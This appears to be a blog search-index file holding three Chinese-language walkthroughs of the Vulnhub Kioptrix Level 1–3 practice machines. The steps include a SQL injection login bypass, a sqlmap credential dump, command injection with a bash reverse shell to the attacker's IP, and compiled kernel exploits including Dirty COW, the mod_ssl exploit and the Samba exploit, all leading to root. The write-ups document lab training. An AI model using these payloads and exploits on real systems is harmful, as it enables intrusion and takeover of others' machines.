<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Kioptix Level 2</title>
    <url>/2021/12/02/Kioptrix-Level-2/</url>
    <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>arp-scan -l</code><br><img src="/2021/12/02/Kioptrix-Level-2/1.png"></p>
<p><code>nmap -sV 192.168.249.130</code>—查看开放端口</p>
<p><img src="/2021/12/02/Kioptrix-Level-2/2.png"></p>
<p>—-<strong>访问下80端口</strong>—-<br><img src="/2021/12/02/Kioptrix-Level-2/3.png"></p>
<p>发现是个登录框先试试万能密码</p>
<p><strong>username:</strong><code>admin&#39; or 1=1#</code><br><strong>password:</strong><code>123(任意密码)</code></p>
<p><strong>发现可以登陆，即存在sql注入</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-2/4.png"></p>
<h4 id="二、0x00漏洞利用-sql注入"><a href="#二、0x00漏洞利用-sql注入" class="headerlink" title="二、0x00漏洞利用(sql注入)"></a>二、0x00漏洞利用(sql注入)</h4><p><strong>sqlmap跑一下数据</strong></p>
<p><em><em>登陆框抓包,因为sql注入在username处，在username处标记</em>(减少测试时间),然后将数据包复制到1.txt中,再用sqlmap跑</em>*</p>
<p><code>sqlmap -r 1 -level 3 -risk 2</code> –<br><img src="/2021/12/02/Kioptrix-Level-2/7.png"></p>
<p><font color="red"><strong>sql注入盲注</strong></font><br><code>sqlmap -r 1 --dbs --level 4 --risk 3 -D &quot;webapp&quot; -T &#39;users&#39; -C &#39;id,password,username&#39; --dump</code>  –<strong>爆出用户名为admin，密码为5afac8d85f</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-2/11.png"></p>
<p><font color="red"><strong>成功登录</strong></font></p>
<h4 id="二、0x01漏洞利用-rce-amp"><a href="#二、0x01漏洞利用-rce-amp" class="headerlink" title="二、0x01漏洞利用(rce&amp;)"></a>二、0x01漏洞利用(rce&amp;)</h4><p><strong>进入后PING框，尝试命令执行</strong><br><img src="/2021/12/02/Kioptrix-Level-2/8.png"><br>发现可以命令执行，但当前为apache权限</p>
<p><img src="/2021/12/02/Kioptrix-Level-2/9.png"></p>
<p><code>1&amp; bash -i &gt;&amp; /dev/tcp/192.168.249.132/4444 0&gt;&amp;1</code> -<strong>先弹shell到本地，此时为apache权限需要提权</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-2/10.png"></p>
<p><code>lsb_release -a</code>–<strong>查看内核</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-2/12.png"></p>
<p><code>searchsploit CentOS  4.5</code>–<strong>查找有无可利用的漏洞</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-2/13.png"></p>
<p>9542.c没法wget,需要wget到kali机上，然后开启simpleHTTPserver<br><code>python -m SimpleHTTPServer 8000</code></p>
<p><code>wget http://192.168.249.132:8000/9542.c</code></p>
<p><strong>/var/www/html权限不够无法wget，先切换到tmp目录</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-2/14.png"></p>
<p><code>gcc -o 9542 9542.c</code>—<strong>编译运行即可</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-2/15.png"></p>
<p><strong>—成功root—-</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptix Level 1</title>
    <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
    <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p> <code>arp-scan -l</code> —<strong>使用网络接口IP地址和网络掩码,生成目标主机地址列表</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/1.png"></p>
<p>靶机: 192.168.249.129</p>
<p><code>nmap -sV 192.168.249.129</code> —<strong>查看开放端口</strong></p>
<p><strong>信息</strong>:<font color="red"><strong>Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b</strong></font></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/2.png"></p>
<p><code>nikto -host http://192.168.249.129/</code> —<strong>开放80、443端口,深入探测</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/3.png"></p>
<p>nikto扫到<font color="red"><strong>CVE-2002-0082(Apache Mod_SSL/Apache-SSL远程缓冲区溢出漏洞)</strong></font></p>
<p><font color="red">443端口使用的mod_ssl服务版本为<strong>2.8.4</strong></font></p>
<h4 id="二、0x01漏洞利用-mod-ssl-2-8-4"><a href="#二、0x01漏洞利用-mod-ssl-2-8-4" class="headerlink" title="二、0x01漏洞利用(mod_ssl-2.8.4)"></a>二、0x01漏洞利用(mod_ssl-2.8.4)</h4><p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/4.png"></p>
<p><code>gcc -o exp 47080.c -lcrypto</code> —<strong>编译</strong></p>
<p><code>./exp</code> —-<strong>查看下参数</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/7.png"></p>
<p><code>./exp | grep apache-1.3.20</code>  —-<strong>找对应的版本</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/5.png"></p>
<p><strong>测试发现攻击偏移量0x6b可以利用</strong><br><code>./exp 0x6b 192.168.249.129 443 -c 40-50</code>  —<strong>root权限</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/8.png"></p>
<h4 id="三、0x02漏洞利用-Samba-2-2-1a"><a href="#三、0x02漏洞利用-Samba-2-2-1a" class="headerlink" title="三、0x02漏洞利用(Samba 2.2.1a)"></a>三、0x02漏洞利用(Samba 2.2.1a)</h4><p>msf对目标主机进行扫描，得到靶机smb版本为<strong>2.2.1a</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/9.png"></p>
<p><code>searchsploit Samba 2.2</code> —<strong>找下有无可利用的漏洞</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/10.png"></p>
<p><code>searchsploit -p 10.c</code> –<strong>寻找路径</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/11.png"></p>
<p><code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/桌面</code> –<strong>复制到桌面</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/12.png"></p>
<p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
<p><strong>—–搞定—–</strong></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptix Level 3</title>
    <url>/2021/12/02/Kioptrix-Level-3/</url>
    <content><![CDATA[<p><strong>靶机：192.168.249.131<br>kali: 192.168.249.132</strong></p>
<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.131</code> –<strong>开放80端口</strong><br><img src="/2021/12/02/Kioptrix-Level-3/1.png"></p>
<p><strong>访问下，发现是个</strong><br><font color="red"><strong>LotusCMS</strong></font></p>
<p><img src="/2021/12/02/Kioptrix-Level-3/2.png"></p>
<p><code>search LotusCMS</code>  —<strong>在msf中查找LotusCMS有关漏洞</strong><br><img src="/2021/12/02/Kioptrix-Level-3/3.png"></p>
<p><code>set URI /</code>–<strong>-这里需要把URL路径改为/</strong><br><img src="/2021/12/02/Kioptrix-Level-3/4.png"></p>
<p><code>run</code> —-<strong>貌似出问题了，无法shell 百度了说是什么中英文版本的问题–没有解决</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-3/5.png"></p>
<p><strong>最后百度了下LotusCMS的exp</strong></p>
<h4 id="二、0x00漏洞利用-LotusCMS漏洞"><a href="#二、0x00漏洞利用-LotusCMS漏洞" class="headerlink" title="二、0x00漏洞利用(LotusCMS漏洞)"></a>二、0x00漏洞利用(LotusCMS漏洞)</h4><p><code>git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit</code></p>
<p><img src="/2021/12/02/Kioptrix-Level-3/6.png"></p>
<p><code>nc -lvp 7777</code><strong>先开启监听端口7777</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-3/7.png"></p>
<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><strong>成功弹到shell优化终端</strong><br><img src="/2021/12/02/Kioptrix-Level-3/8.png"><br><strong>发现权限不是root权限</strong><br><img src="/2021/12/02/Kioptrix-Level-3/9.png"></p>
<h4 id="三、0x01提权-脏牛提权"><a href="#三、0x01提权-脏牛提权" class="headerlink" title="三、0x01提权(脏牛提权)"></a>三、0x01提权(脏牛提权)</h4><p><code>uname -a</code>–<strong>查看内核(2.6.24-24)</strong></p>
<p><code>searchsploit privilege | grep linux | grep 2.6.2</code>  **–**<strong>查找有无可利用漏洞</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-3/10.png"></p>
<p>–<strong>先将40839.c先wget到本地后再wget到靶机上–</strong></p>
<p><code>cd /tmp</code>  <strong>先到靶机tmp目录</strong></p>
<p><code>wget http://192.168.249.132:8000/40839.c</code>  –这里使用的是<strong>SimpleHTTPServer</strong></p>
<p><code>gcc -pthread 40839.c -o 40839 -lcrypt</code><strong>–按照40839.c的注释进行编译</strong></p>
<p><code>./40839 123456</code><br><img src="/2021/12/02/Kioptrix-Level-3/11.png"></p>
<p><strong>–设置密码为123456</strong></p>
<p><img src="/2021/12/02/Kioptrix-Level-3/12.png"></p>
<p><code>ssh firefart@192.168.249.131</code> <strong>—SSH连接成功root权限</strong><br><img src="/2021/12/02/Kioptrix-Level-3/13.png"></p>
]]></content>
      <categories>
        <category>Vulnhub系列</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
</search>
